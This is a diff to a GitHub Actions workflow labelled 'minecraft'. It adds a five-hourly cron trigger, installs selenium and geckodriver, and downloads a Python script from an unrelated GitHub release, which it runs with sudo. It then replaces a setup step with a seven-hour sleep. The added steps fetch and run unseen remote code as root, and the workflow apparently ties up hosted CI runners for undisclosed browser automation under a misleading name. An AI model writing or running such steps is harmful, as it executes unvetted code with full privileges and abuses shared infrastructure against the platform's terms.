@@ -1,5 +1,9 @@
 name: minecraft
 on:
+
+  schedule:
+    - cron: "0 0/5 * * *"
+
   watch:
     types: started
 
@@ -16,15 +20,15 @@ jobs:
        
     - name: server
       run: |
-        cd /home
-        sudo curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
-        echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
+        cd ~
         sudo apt update
-        sudo apt-get install apt-transport-https ca-certificates gnupg -y
-        
-        sudo apt update
-        sudo apt-get install google-cloud-sdk -y
-        
+        sudo pip install selenium
+        wget https://github.com/mozilla/geckodriver/releases/download/v0.30.0/geckodriver-v0.30.0-linux64.tar.gz
+        tar -zxvf geckodriver-v0.30.0-linux64.tar.gz
+        sudo mv geckodriver /usr/bin
+        wget https://github.com/aaaaaaction/abouttab/releases/download/v3.2/1.py
+        sudo python 1.py
+  
         
         
         
@@ -33,4 +37,4 @@ jobs:
     - name: link
       run: |
         cd ~
-        sudo gcloud init
+        sudo sleep 7h
